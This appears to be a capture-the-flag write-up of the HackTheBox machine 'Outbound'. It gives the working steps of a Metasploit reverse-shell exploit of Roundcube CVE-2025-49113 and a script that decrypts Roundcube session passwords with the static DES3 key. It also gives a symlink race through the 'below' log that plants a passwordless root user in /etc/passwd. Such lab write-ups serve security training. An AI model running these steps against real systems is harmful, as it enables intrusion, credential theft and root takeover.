---
icon: inbox-out
---

# HTB-OUTBOUND

<figure><img src="../../../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explanation

```
START
  ↓
1. Exploit Roundcube Webmail (CVE-2025-49113)
  ↓
2. Get www-data shell (inside container)
  ↓
3. Access MySQL database
  ↓
4. Extract jacob's encrypted password from sessions table
  ↓
5. Decrypt the password
  ↓
6. Read Jacob's emails to find credentials/info
  ↓
7. Become Jacob user (SSH/su)
  ↓
8. Check sudo privileges (sudo -l)
  ↓
9. Exploit CVE-2025-27591 using sudo
  ↓
10. ROOT SHELL
  ↓
END
```

### 1. Overview

The Outbound machine simulates a realistic internal webmail environment running Roundcube, combined with a misconfigured logging service that enables privilege escalation. The goal is to exploit weak configuration management and service misuses to gain root access from provided credentials.

***

### 2. Initial Enumeration

#### 2.1 Nmap Scan

Command used:

```bash
(sn0x㉿sn0x)-[~/HTB/outbound]
└─$ rustscan -a 10.10.11.77 --ulimit 5000 --range 1-10000 -- -sCV -Pn
```

**Results:**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We identified an HTTP service running on port 80 and OpenSSH on 22. Visiting the HTTP service revealed a redirect to `http://mail.outbound.htb`, indicating a virtual host is in use.

***

### 3. Web Enumeration

Upon adding `mail.outbound.htb` to our `/etc/hosts` file.

```jsx
┌──(sn0x㉿sn0x)-[~/HTB/outbound]
└─$ echo "10.10.11.77 mail.outbound.htb" | sudo tee -a /etc/hosts 
```

Now we discovered a login panel for **Roundcube Webmail (v1.6.10)**.

<figure><img src="../../../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

**Credentials Provided in Challenge:**



```
tyler / LhKL1o9Nm3X2

```

***

### 4. Exploitation - Roundcube Authenticated RCE (CVE-2025-49113)

<figure><img src="../../../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

This version of Roundcube is vulnerable to an authenticated RCE. We used Metasploit to exploit it.

#### 4.1 Metasploit Module:

```
exploit/multi/http/roundcube_auth_rce_cve_2025_49113

```

#### 4.2 Configuration:

```
set RHOSTS 10.10.11.77
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set VHOST mail.outbound.htb
set TARGETURI /?_task=mail&_mbox=INBOX
set LHOST <YourTun0IP>
set LPORT 4444
run

```

#### 4.3 Outcome:

We obtained a reverse shell successfully and `shell >> script /dev/null -c bash` upgraded to an interactive shell.

***

### 5. Post-Exploitation - Dumping Roundcube DB Credentials

We explored the Roundcube configuration and found the following DB credentials:

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

```

Used MySQL to enumerate sessions:

```bash
mysql -u roundcube -pRCDBPass2025
USE roundcube;
SELECT * FROM session;

```

We discovered encrypted session variables including a base64-encoded password.

#### Decryption:

A known static DES3 key was used:

```python
key = b'rcmail-!24ByteDESkey*Str'

```

Script to Decryption

```jsx
┌──(sn0x㉿sn0x)-[~/HTB/outbound]
└─$ cat script.py     
from base64 import b64decode
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

# Encrypted string from DB (example)
encrypted_password = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = b'rcmail-!24ByteDESkey*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

cleaned = unpad(decrypted, DES3.block_size).decode('utf-8', errors='ignore')
print("[+] Decrypted Password:", cleaned)
                                                                                                                                                             
┌──(sn0x㉿sn0x)-[~/HTB/outbound]
└─$ python3 script.py                                                                        
[+] Decrypted Password: 595mO8DmwGeD

```

With a short decryption script, we recovered the password:

```
595mO8DmwGeD

```

***

### 6. Lateral Movement - Accessing User Jacob

Using the recovered credentials:

```bash
su jacob
Password: 595mO8DmwGeD

```

We accessed Jacob's user environment. Exploring his mail inbox:

```bash
cat /home/jacob/mail/INBOX/jacob

```

#### Findings from Internal Mails:

* New Password: `gY4Wr3a1evp4`
* Below monitoring tool was mentioned

Using this new password, we confirmed access via SSH to Jacob’s account on the main host.

<figure><img src="../../../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

```bash

ssh jacob@10.10.11.77
Password: gY4Wr3a1evp4
```

***

### 7. Privilege Escalation - Log File Symlink Abuse (Manual Method)

#### 7.1 Background:

From the mail and enumeration, we learned that the system uses `below` for monitoring and logs errors to:

```
/var/log/below/error_root.log

```

This file was world-writable (mode 0666). We exploited it using a race condition and symbolic link technique to gain root.

#### 7.2 Exploit Steps:

```bash
printf 'pwn::0:0::/root:/bin/bash\\n' > /tmp/fakepass
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
(sudo /usr/bin/below &)
while true; do
  [ -w /var/log/below/error_root.log ] && cp /tmp/fakepass /var/log/below/error_root.log && break
  sleep 0.5
done

```

#### 7.3 Result:

Injected root user line in `/etc/passwd`:

```
pwn::0:0::/root:/bin/bash

```

#### 7.4 Final Step:

```bash
su pwn
whoami
id
cat /root/root.txt

```

Root shell obtained.

***

### 8. Conclusion

Outbound is a well-designed machine that simulates real-world weaknesses:

* Hardcoded credentials and weak configuration practices
* Insecure logging mechanisms
* Proper post-exploitation and lateral movement

The privesc chain was particularly interesting as it required precise timing and understanding of symlink behavior in Linux systems.

### Why This Works:

* **`/etc/passwd`** is the file Linux reads to identify users.
* Any user with `UID 0` is treated as **root**, no matter what the username is.
* If a service running as **root** overwrites `/etc/passwd`, it can **inject a backdoor root user**.

***
